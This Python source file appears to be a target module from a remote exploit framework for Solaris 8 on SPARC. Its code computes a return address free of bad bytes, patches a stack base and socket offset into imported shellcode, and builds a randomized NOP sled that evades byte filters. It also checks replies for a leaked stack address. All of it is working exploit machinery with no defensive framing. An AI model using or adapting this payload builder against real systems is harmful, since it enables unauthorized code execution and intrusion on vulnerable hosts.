import solaris
import solaris8shellcode
import utils

class solaris8(solaris.solaris):
   def __init__(self, stackBase=0xfd576000L):
      self.stackBase = stackBase

   version = "Solaris 8"
   l7Stack = -0xb0

   def buildShellcodeBuffer(self, target):
      stackBase = target.stackBase
      basePC = stackBase + target.bigBufOffset
      pc = basePC
      while (utils.intHasBadBytes(pc - 8, target.badBytes)):
         pc += 4
      solaris8shellcode.stackbase = \
         utils.stringifyAddr(stackBase + self.l7Stack)
      solaris8shellcode.socket_offset = \
         utils.stringifyAddr(target.socketOffset)
      badRegs = range(0, 8) + [14, 30, 31]	# global regs, sp, fp, and i7
      shellcode = solaris8shellcode.build()
      sledLen = (target.bigBufLen - len(shellcode)) / 4
      sled = ''
      for i in range(0, sledLen):
         nop = utils.randomSparcNOP(badRegs, target.badBytes)
         sled += utils.stringifyAddr(nop)
      shellcodeBuf = sled \
                     + shellcode
      target.pc = pc
      return shellcodeBuf

   def validReply(self, target, reply, stackBase):
      for i in range(0, 16, 4):
         match = utils.buf2long(reply[i:i+4])
         if (stackBase == match):
            return True
      return False
